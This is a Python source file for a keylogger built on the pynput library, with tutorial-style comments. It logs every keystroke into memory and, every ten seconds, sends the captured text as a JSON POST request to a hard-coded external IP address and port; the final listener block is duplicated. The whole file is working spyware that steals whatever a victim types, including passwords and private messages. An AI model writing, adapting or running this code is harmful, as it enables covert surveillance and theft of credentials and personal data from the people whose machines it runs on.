# Install pynput using the following command: pip install pynput
# Import the mouse and keyboard from pynput
import json
import threading
import requests
from pynput import keyboard

# Make a global variable text to save keystrokes for later sending to the server
text = ""

# Hard code the values of your server and IP address here
ip_address = "109.74.200.23"
port_number = "8080"
# Time interval in seconds for code to execute
time_interval = 10

def send_post_req():
    try:
        # Convert the Python object into a JSON string
        payload = json.dumps({"keyboardData": text})
        # Send the POST Request to the server
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type": "application/json"})
        # Set up a timer function to run every time_interval specified seconds
        timer = threading.Timer(time_interval, send_post_req)
        # Start the timer thread
        timer.start()
    except:
        print("Couldn't complete request!")

# Log the key only once it is released to consider the modifier keys
def on_press(key):
    global text

    # Handle the way the key gets logged to the in-memory string
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        # Explicitly convert the key object to a string and then append it to the string held in memory
        text += str(key).strip("'")

# A keyboard listener is a threading.Thread, and a callback on_press will be invoked from this thread
# In the on_press function, we specified how to deal with the different inputs received by the listener
with keyboard.Listener(on_press=on_press) as listener:
    # Start by sending the POST request to the server
    send_post_req()
    listener.join()

# A keyboard listener is a threading.Thread, and a callback on_press will be invoked from this thread.
# In the on_press function we specified how to deal with the different inputs received by the listener.
with keyboard.Listener(
    on_press=on_press) as listener:
    # We start of by sending the post request to our server.
    send_post_req()
    listener.join()
